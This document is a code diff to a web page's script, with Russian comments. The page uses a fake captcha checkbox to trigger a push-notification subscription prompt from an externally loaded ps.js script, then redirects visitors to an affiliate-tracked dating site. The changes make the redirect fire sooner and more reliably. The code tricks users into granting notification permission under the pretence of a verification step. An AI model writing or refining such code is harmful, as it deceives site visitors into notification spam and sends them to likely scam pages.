@@ -113,7 +113,7 @@
         </div>
     </div>
 
-    <script>
+<script>
     // Ссылка для редиректа
     const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
 
@@ -134,8 +134,12 @@
         }
     }
 
-    // Функция для вызова подписки
+    // Функция для вызова подписки и редиректа
     function requestSubscriptionAndRedirect() {
+        // Сбрасываем состояние чекбокса
+        const checkbox = document.getElementById('captcha');
+        checkbox.checked = false;
+
         // Проверяем наличие API от ps.js
         if (window.ps && typeof window.ps.showPrompt === 'function') {
             console.log('Вызываем подписку через ps.js');
@@ -143,19 +147,33 @@
             const timeout = setTimeout(() => {
                 console.log('Тайм-аут: ps.js не вернул результат, выполняем редирект');
                 performRedirect();
-            }, 5000); // 5 секунд ожидания
+            }, 3000); // 3 секунды ожидания
 
-            window.ps.showPrompt()
-                .then(result => {
-                    clearTimeout(timeout); // Отменяем таймер
-                    console.log('Результат подписки:', result);
-                    performRedirect(); // Редирект после ответа
-                })
-                .catch(err => {
-                    clearTimeout(timeout); // Отменяем таймер
-                    console.error('Ошибка вызова подписки:', err);
-                    performRedirect(); // Редирект при ошибке
-                });
+            try {
+                window.ps.showPrompt()
+                    .then(result => {
+                        clearTimeout(timeout);
+                        console.log('Результат подписки:', result);
+                        performRedirect();
+                    })
+                    .catch(err => {
+                        clearTimeout(timeout);
+                        console.error('Ошибка вызова подписки:', err);
+                        performRedirect();
+                    })
+                    .finally(() => {
+                        // Проверяем статус уведомлений
+                        if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+                            clearTimeout(timeout);
+                            console.log('Статус уведомлений после showPrompt:', Notification.permission);
+                            performRedirect();
+                        }
+                    });
+            } catch (err) {
+                clearTimeout(timeout);
+                console.error('Синхронная ошибка в ps.js:', err);
+                performRedirect();
+            }
         } else {
             console.log('API ps.js не доступен, используем Notification API');
             // Запасной вариант: Notification API
@@ -167,11 +185,11 @@
                     Notification.requestPermission()
                         .then(permission => {
                             console.log('Результат разрешения:', permission);
-                            performRedirect(); // Редирект после любого ответа
+                            performRedirect();
                         })
                         .catch(err => {
                             console.error('Ошибка Notification API:', err);
-                            performRedirect(); // Редирект при ошибке
+                            performRedirect();
                         });
                 }
             } else {
@@ -198,7 +216,6 @@
 
     // Событие на клик по кнопке
     document.getElementById('submit-button').addEventListener('click', verify);
-        
 </script>
 
     <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q" async></script>
